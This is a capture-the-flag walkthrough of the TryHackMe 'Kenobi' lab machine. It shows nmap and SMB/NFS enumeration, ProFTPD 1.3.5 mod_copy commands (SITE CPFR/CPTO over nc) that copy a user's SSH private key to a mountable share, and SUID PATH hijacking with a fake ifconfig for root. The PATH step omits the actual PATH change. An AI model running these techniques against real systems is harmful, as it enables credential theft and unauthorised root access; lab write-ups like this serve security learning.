---
title: "Tryhackme Kenobi Walkthrough"
date: 2021-01-04 14:05 +0800
categories: [Tryhackme, Linux]
tags: [SMB, NFS share, SUID ]
author: CEngover
image: /assets/img/posts/kenobi/image.jpg
---

In this article, we're going to solve `Kenobi` vulnerable machine from [Tryhackme](https://tryhackme.com/). Steps of the solution has described in below.

### Reconnaissance

- Nmap Scanning
- Enumeration of Samba
- Enumeration of NFS

### Exploitation

- Manipulate vulnerable version of ProFTP
- Getting id_rsa file
- SSH connection

### Privilege Escalation

- Finding SUID binaries
- Path variable manipulation via ifconfig 

## Reconnaissance

As always we do, let's start with nmap scan to the target.

> sudo nmap -sC -sV -oA nmap/kenobi-open-ports -vv 10.10.5.29

```bash
# Nmap 7.80 scan initiated Mon Jan  4 05:00:27 2021 as: nmap -sC -sV -oA nmap/kenobi-open-ports -vv 10.10.5.29
Nmap scan report for 10.10.5.29
Host is up, received echo-reply ttl 63 (0.087s latency).
Scanned at 2021-01-04 05:00:27 EST for 18s
Not shown: 993 closed ports
Reason: 993 resets
PORT     STATE SERVICE     REASON         VERSION
21/tcp   open  ftp         syn-ack ttl 63 ProFTPD 1.3.5
22/tcp   open  ssh         syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8m00IxH/X5gfu6Cryqi5Ti2TKUSpqgmhreJsfLL8uBJrGAKQApxZ0lq2rKplqVMs+xwlGTuHNZBVeURqvOe9MmkMUOh4ZIXZJ9KNaBoJb27fXIvsS6sgPxSUuaeoWxutGwHHCDUbtqHuMAoSE2Nwl8G+VPc2DbbtSXcpu5c14HUzktDmsnfJo/5TFiRuYR0uqH8oDl6Zy3JSnbYe/QY+AfTpr1q7BDV85b6xP97/1WUTCw54CKUTV25Yc5h615EwQOMPwox94+48JVmgE00T4ARC3l6YWibqY6a5E8BU+fksse35fFCwJhJEk6xplDkeauKklmVqeMysMWdiAQtDj
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBpJvoJrIaQeGsbHE9vuz4iUyrUahyfHhN7wq9z3uce9F+Cdeme1O+vIfBkmjQJKWZ3vmezLSebtW3VRxKKH3n8=
|   256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGB22m99Wlybun7o/h9e6Ea/9kHMT0Dz2GqSodFqIWDi
80/tcp   open  http        syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
111/tcp  open  rpcbind     syn-ack ttl 63 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      38494/udp6  mountd
|   100005  1,2,3      50429/tcp6  mountd
|   100005  1,2,3      56787/tcp   mountd
|   100005  1,2,3      57736/udp   mountd
|   100021  1,3,4      37757/tcp   nlockmgr
|   100021  1,3,4      38499/tcp6  nlockmgr
|   100021  1,3,4      41446/udp6  nlockmgr
|   100021  1,3,4      56208/udp   nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack ttl 63 Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp open  nfs_acl     syn-ack ttl 63 2-3 (RPC #100227)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h00m00s, deviation: 3h27m51s, median: 0s
| nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   KENOBI<00>           Flags: <unique><active>
|   KENOBI<03>           Flags: <unique><active>
|   KENOBI<20>           Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 18474/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 24006/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 35230/udp): CLEAN (Failed to receive data)
|   Check 4 (port 41593/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2021-01-04T04:00:41-06:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-01-04T10:00:41
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jan  4 05:00:45 2021 -- 1 IP address (1 host up) scanned in 18.22 seconds
```

According to nmap scan output, the target has 7 open ports. 
- ProFTPD 1.3.5 is running on port 21.
- OpenSSH 7.2 is running on port 22.
- Apache 2.4.18 is running on port 80 and also there is a file called admin.html which is accessible.
- 139 and 445 Samba for share default ports
- NFS (Network File System) service is running on 2049.

Let's enumerate one by one. First of all, we have ProFTPD service which is using for file transfer, the version is 1.3.5. There is a few method that we can do. We can check that is there any anonymous login or does the version of ProFTPD has vulnerability. I tried anonymous login but it failed. 

> searchsploit ProFTPd 1.3.5

After a quick searchsploit command, we can see that there are 3 vulnerabilities that ProFTPD 1.3.5 is affected. We'll use one of them which has been published with [CVE-2015-3306](https://www.exploit-db.com/exploits/36742) code in exploit-db. Unfortunately, we don't know how to use this vulnerability. Let's move on with Apache.

When we visit the web page via 80 port, we see that there are only 2 pages which are html and nothing useful. 

Next one is RPC service. When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve. 

> nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.5.29

As a result, we can see /var folder that is mountable.

## Exploitation

Let's jump into SMB. For SMB enumeration we can use smbclient tool. With the command given below, we can see share folders.

> smbclient -L \\\\10.10.5.29\\
> smbclient \\\\10.10.5.29\\anonymous -U ''

![smbclient](/assets/img/posts/kenobi/smbclient.png){: width="500"}
_Listing share folders_

As you see above the picture, we have a file called log.txt. You can see the contents of the file below.

```bash
Generating public/private rsa key pair.
Enter file in which to save the key (/home/kenobi/.ssh/id_rsa): 
Created directory '/home/kenobi/.ssh'.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/kenobi/.ssh/id_rsa.
Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:C17GWSl/v7KlUZrOwWxSyk+F7gYhVzsbfqkCIkr2d7Q kenobi@kenobi
The key's randomart image is:
+---[RSA 2048]----+
|                 |
|           ..    |
|        . o. .   |
|       ..=o +.   |
|      . So.o++o. |
|  o ...+oo.Bo*o  |
| o o ..o.o+.@oo  |
|  . . . E .O+= . |
|     . .   oBo.  |
+----[SHA256]-----+

# This is a basic ProFTPD configuration file (rename it to 
# 'proftpd.conf' for actual use.  It establishes a single server
# and a single anonymous login.  It assumes that you have a user/group
# "nobody" and "ftp" for normal operation and anon.

ServerName			"ProFTPD Default Installation"
ServerType			standalone
DefaultServer			on

# Port 21 is the standard FTP port.
Port				21

```

We can see that the user-generated id_rsa file exists in Kenobi's home directory. Let's put the pieces together. We have vulnerable ProFTPd service, /var folder that we can mount and id_rsa file we can reach. If we copy rsa file to under /var folder, when we mount the folder we able to read rsa file and get access to the target. Firts, we need to copy rsa file to /var directory. We can do it via nc connection by connecting 21 port.

> nc 10.10.5.29 21
```bash
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```
![nc connection](/assets/img/posts/kenobi/nc.png){: width="500"}
_nc connection_

After copying the file, let's mount the var directory.

```bash
sudo mkdir /mnt/kenobi
sudo mount 10.10.5.29:/var /mnt/kenobi
sudo cp /mnt/kenobi/tmp/id_rsa .
```
![Mounting var dir](/assets/img/posts/kenobi/mount.png){: width="500"}
_Reading rsa file_

Now, we can read id_rsa file and get access to target system.

```bash
chmod 600 id_rsa
ssh -i id_rsa kenobi@10.10.5.29
```
![SSH Connection](/assets/img/posts/kenobi/sshconnection.png){: width="500"}
_SSH Connection_

## Privilege Escalation

We're inside. Now we have to gain root privileges. I checked that is there any sudo rights that defined to me on the system but there's nothing. The next step will be to check whether any suid binaries can be manipulated in the prompt.

> find / -perm -u=s -type f 2>/dev/null

![SUID Binaries](/assets/img/posts/kenobi/suidbins.png){: width="500"}
_Suid Binaries_

As seen in the picture, there is a suid binary named `menu`. It's a specially written program. 

![Menu Program](/assets/img/posts/kenobi/menubin.png){: width="500"}
_Menu Program_

When we run the program, see that there is a few system options like ifconfig, kernel version. The binary is belong to root user and root group.

> strings /usr/bin/menu

![Strings command](/assets/img/posts/kenobi/commands.png)
_Readable strings_

If we check human readable strings that belong to menu binary via strings command, see that there are 3 system command. If we manipulate the binary we can gain root privileges. To do this we'll use path variable manipulation method. With this method, we can run system programs by changing our path variable and running the code pieces we have written as a system program.

```bash
echo $PATH
mkdir bin
cd bin
echo "/bin/bash" > ifconfig
chmod +x ifconfig
/usr/bin/menu 
```

![Path Manipulation](/assets/img/posts/kenobi/pathmanip.png){: width="500"}
_Path Manipulation_

When we follow the steps, we'll be gained root access.